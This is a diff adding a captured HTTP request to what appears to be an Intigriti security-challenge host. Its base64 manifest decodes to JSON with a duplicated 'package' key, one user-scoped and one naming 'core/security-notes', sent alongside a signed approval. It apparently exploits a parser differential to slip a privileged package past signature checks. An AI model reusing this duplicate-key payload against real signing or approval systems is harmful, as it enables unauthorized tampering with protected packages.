@@ -1,0 +1,10 @@
+POST /api/publications HTTP/1.1
+Host: challenge-0726.intigriti.io
+User-Agent: curl/8.20.0
+Accept: */*
+Cookie: cy_session=JwkUT3jL…REDACTED
+content-type: application/json
+x-csrf-token: c9ada9083ec26246…REDACTED
+Content-Length: 753
+
+{"manifest_b64": "ewogICJwYWNrYWdlIjogewogICAgInNjb3BlIjogImhheDQ0MjY1LWQwOThkMWUxIiwKICAgICJuYW1lIjogImhlbGxvLXdvcmxkIiwKICAgICJ2ZXJzaW9uIjogIjEuMC4wIgogIH0sCiAgInBhY2thZ2UiOiB7CiAgICAic2NvcGUiOiAiY29yZSIsCiAgICAibmFtZSI6ICJzZWN1cml0eS1ub3RlcyIsCiAgICAidmVyc2lvbiI6ICIxLjAuMCIKICB9LAogICJtZXRhZGF0YSI6IHsKICAgICJkZXNjcmlwdGlvbiI6ICJ4IiwKICAgICJ2aXNpYmlsaXR5IjogInByaXZhdGUiCiAgfSwKICAib3BlcmF0aW9uIjogInByZWZsaWdodCIKfQ==", "approval_id": "ef80efc8-6801-4775-9981-aff59cf22c86", "manifest_sha256": "e490e65a5d588d8fbab5db1253eb21fdbc5aead825aebd00ecfd5d8b50d9bab3", "nonce": "VWZHPYDV2nWLXextoMh-UdOmAle6dMEQaC8WsAkgs28", "expires_at": 1785449765, "signature": "eHuvMQ5W6oVSW9x+Etqt…"}
